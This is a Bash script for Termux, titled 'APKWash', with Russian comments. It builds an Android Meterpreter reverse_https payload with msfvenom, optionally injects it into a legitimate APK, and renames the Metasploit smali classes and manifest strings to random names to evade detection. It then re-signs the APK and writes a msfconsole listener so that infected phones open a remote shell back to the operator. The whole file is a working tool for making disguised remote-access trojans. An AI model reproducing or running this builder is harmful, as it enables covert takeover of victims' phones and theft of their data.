#!/data/data/com.termux/files/usr/bin/env bash

# APKWash for Termux

PAYLOAD="android/meterpreter/reverse_https"
LHOST=$(ifconfig 2>/dev/null | awk '/rndis0/{f=1} f && /inet /{print $2; exit}')
LPORT="443"
VERBOSE=0
DEBUG=0
inFile=""
outFile="AndroidService.apk"
willRun=0

fullPath=$outFile
APK=$(basename "$fullPath")
apkName=$(echo "$APK" | cut -f 1 -d '.')

# Randomized smali paths
VAR1=$(head /dev/urandom | tr -dc a-z | head -c 10 || true)
VAR2=$(head /dev/urandom | tr -dc a-z | head -c 10 || true)
VAR3=$(head /dev/urandom | tr -dc a-z | head -c 10 || true)
VAR4=$(head /dev/urandom | tr -dc a-z | head -c 10 || true)
VAR5=$(head /dev/urandom | tr -dc a-z | head -c 10 || true)
VAR6=$(head /dev/urandom | tr -dc a-z | head -c 10 || true)
VAR7=$(head /dev/urandom | tr -dc a-z | head -c 10 || true)
VAR8=$(head /dev/urandom | tr -dc a-z | head -c 10 || true)

JAR="$PREFIX/bin/apktool.jar"
TMPDIR="$PREFIX/tmp/apkwash"
mkdir -p "$TMPDIR"

localAddresses=$(ifconfig 2>/dev/null | awk '/inet /{print $2}')
localAddArray=($localAddresses)

redirect() {
    if [ "$VERBOSE" -eq 0 ]; then
        "$@" &> /dev/null
    else
        "$@"
    fi
}

createListener() {
    echo "use multi/handler" > "$TMPDIR/$apkName.listener"
    echo "set payload $PAYLOAD" >> "$TMPDIR/$apkName.listener"
    isLocal=$(ifconfig | grep -c "$LHOST")
    if [[ $isLocal -eq 0 ]]; then
        echo "[!] LHOST не найден, выберите вручную:"
        localAddArray+=("$LHOST")
        for i in "${!localAddArray[@]}"; do
            echo " [$i] ${localAddArray[$i]}"
        done
        read -r -p "Выберите IP: " userSelectedAdd
        if [[ "$userSelectedAdd" =~ ^[0-9]+$ ]] && [ "$userSelectedAdd" -lt "${#localAddArray[@]}" ]; then
            LHOST=${localAddArray[$userSelectedAdd]}
        fi
    fi
    read -r -p "Добавить AutoRunScript? [y/N] " response
    if [[ "$response" =~ ^[yY]$ ]]; then
        read -r -p " > " autoRunThis
        echo "set AutoRunScript $autoRunThis" >> "$TMPDIR/$apkName.listener"
    fi
    echo "set LHOST $LHOST" >> "$TMPDIR/$apkName.listener"
    echo "set LPORT $LPORT" >> "$TMPDIR/$apkName.listener"
    echo "set ExitOnSession false" >> "$TMPDIR/$apkName.listener"
    echo "exploit -j" >> "$TMPDIR/$apkName.listener"
    echo "[+] Listener готов: msfconsole -r $TMPDIR/$apkName.listener"
}

# Обработка аргументов
while [ -n "$1" ]; do
    case "$1" in
        -h|--help)
            echo "Usage: apkwash [-p payload] [-o output.apk] LHOST=ip LPORT=port"
            exit 0 ;;
        -p|--payload) PAYLOAD="$2"; willRun=1; shift ;;
        -o|--output) outFile="$2"; fullPath=$outFile; APK=$(basename "$fullPath"); apkName=$(echo "$APK" | cut -f 1 -d '.'); willRun=1; shift ;;
        -x|--original) inFile="$2"; willRun=1; shift ;;
        -g|--generate) willRun=1 ;;
        -v|--verbose) VERBOSE=1 ;;
        -n|--newkey) rm -f ~/.android/debug.keystore ;;
        -d|--debug) DEBUG=1 ;;
        *) ;;
    esac
    shift
done

# Парсинг LHOST/LPORT
for arg in "$@"; do
    IFS='=' read -r k v <<< "$arg"
    [ "$k" == "LHOST" ] && LHOST="$v" && willRun=1
    [ "$k" == "LPORT" ] && LPORT="$v" && willRun=1
done

[[ "$willRun" -eq 0 ]] && exit 1

redirect rm -f "$outFile"

# Генерация payload
echo "[*] Генерация payload..."
if [ -z "$inFile" ]; then
    redirect msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -o "$outFile"
else
    redirect msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -x "$inFile" -o "injected_$inFile"
    [[ ! -f "injected_$inFile" ]] && echo "[!] Ошибка генерации" && exit 1
    apkName=$(basename "$inFile")
    createListener
    exit 0
fi

[[ ! -f "$outFile" ]] && echo "[!] Ошибка генерации msfvenom." && exit 1

# Проверка apktool
if [ ! -f "$JAR" ]; then
    echo "[*] apktool.jar не найден. Скачиваем..."
    wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.3.jar -O "$JAR"
    chmod +x "$JAR"
fi

redirect java -jar "$JAR" d -f -o "$TMPDIR/payload" "$fullPath"

# Рандомизация smali
mv "$TMPDIR/payload/smali/com/metasploit" "$TMPDIR/payload/smali/com/$VAR1" 2>/dev/null
mv "$TMPDIR/payload/smali/com/$VAR1/stage" "$TMPDIR/payload/smali/com/$VAR1/$VAR2" 2>/dev/null
mv "$TMPDIR/payload/smali/com/$VAR1/$VAR2/Payload.smali" "$TMPDIR/payload/smali/com/$VAR1/$VAR2/$VAR3.smali" 2>/dev/null

sed -i "s#/metasploit/stage#/$VAR1/$VAR2#g" "$TMPDIR/payload/smali/com/$VAR1/$VAR2/"*
sed -i "s#Payload#$VAR3#g" "$TMPDIR/payload/smali/com/$VAR1/$VAR2/"*
sed -i "s#com.metasploit.meterpreter.AndroidMeterpreter#com.$VAR4.$VAR5.$VAR6#" "$TMPDIR/payload/smali/com/$VAR1/$VAR2/$VAR3.smali"
sed -i "s#payload#$VAR7#g" "$TMPDIR/payload/smali/com/$VAR1/$VAR2/$VAR3.smali"
sed -i "s#com.metasploit.stage#com.$VAR1.$VAR2#" "$TMPDIR/payload/AndroidManifest.xml"
sed -i "s#metasploit#$VAR8#" "$TMPDIR/payload/AndroidManifest.xml"
sed -i "s#MainActivity#$apkName#" "$TMPDIR/payload/res/values/strings.xml"
sed -i '/.SET_WALLPAPER/d' "$TMPDIR/payload/AndroidManifest.xml"
sed -i '/WRITE_SMS/a<uses-permission android:name="android.permission.SET_WALLPAPER"/>' "$TMPDIR/payload/AndroidManifest.xml"

# Сборка
echo "[*] Пересборка APK..."
redirect java -jar "$JAR" b "$TMPDIR/payload"
mv "$TMPDIR/payload/dist/$APK" "$outFile"

# Подпись
echo "[*] Подпись APK..."
if [ ! -f ~/.android/debug.keystore ]; then
    mkdir -p ~/.android
    keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android \
        -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000
fi
redirect jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android \
    -digestalg SHA1 -sigalg MD5withRSA "$outFile" androiddebugkey

[[ "$DEBUG" -ne 1 ]] && rm -rf "$TMPDIR/payload"

createListener

echo "[+] Готово! SMALI путь: com.$VAR1.$VAR2"
